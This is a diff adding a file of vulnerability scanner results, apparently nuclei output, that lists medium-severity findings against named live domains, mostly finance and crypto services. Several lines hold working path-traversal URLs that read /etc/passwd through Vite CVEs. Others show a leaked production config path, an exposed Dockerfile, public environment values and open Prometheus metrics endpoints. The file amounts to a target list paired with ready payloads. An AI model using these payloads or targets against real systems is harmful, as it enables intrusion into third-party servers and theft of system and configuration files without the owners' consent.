@@ -1,0 +1,14 @@
+[CVE-2025-30208] [http] [medium] https://angle.money/etc/passwd?raw
+[CVE-2025-30208] [http] [medium] https://www.angle.money/etc/passwd?raw
+[CVE-2025-30208] [http] [medium] https://xbanking.org/etc/passwd?raw??
+[CVE-2025-31125] [http] [medium] https://xbanking.org/@fs/etc/passwd?import&?inline=1.wasm?init
+[CVE-2025-31486] [http] [medium] https://xbanking.org/etc/passwd?.svg?.wasm?init
+[CVE-2026-39365] [http] [medium] https://xbanking.org/node_modules/.vite/deps/../../../config.production.js.map ["/var/www/xbanking/landing/config.production.js"]
+[CVE-2026-55592] [http] [medium] https://base-miniapp.reserve.org/healthz ["1"]
+[dockerfile-hidden-disclosure] [http] [medium] https://agents.morpho.org/Dockerfile
+[nextjs-vite-public-env:public_env] [http] [medium] https://news.monad.xyz/subscribe [""VITE_ADNETWORK_PIXELV2_URL":"https://beehiiv-adnetwork-production.s3.amazonaws.com/pixel-v2.js"",""VITE_BIRDIE_CLIENT_ID":"q2je1lwj"",""VITE_HUMAN_ENABLED":"true"",""VITE_HUMAN_URL":"//client.px-cloud.net/PXeBumDLwe/main.min.js"",""VITE_ADNETWORK_PIXELJS_URL":"https://beehiiv-adnetwork-production.s3.amazonaws.com/pixel-js.js""]
+[nextjs-vite-public-env:public_env] [http] [medium] https://newsletter.level.finance [""VITE_HUMAN_ENABLED":"true"",""VITE_HUMAN_URL":"//client.px-cloud.net/PXeBumDLwe/main.min.js"",""VITE_ADNETWORK_PIXELJS_URL":"https://beehiiv-adnetwork-production.s3.amazonaws.com/pixel-js.js"",""VITE_ADNETWORK_PIXELV2_URL":"https://beehiiv-adnetwork-production.s3.amazonaws.com/pixel-v2.js"",""VITE_BIRDIE_CLIENT_ID":"q2je1lwj""]
+[prometheus-metrics] [http] [medium] https://api-v2.pendle.finance/api/metrics
+[prometheus-metrics] [http] [medium] https://api.yieldnest.finance/metrics
+[prometheus-metrics] [http] [medium] https://mmbots.dexalot.com/metrics
+[prometheus-metrics] [http] [medium] https://staging-api.pendle.finance/api/metrics
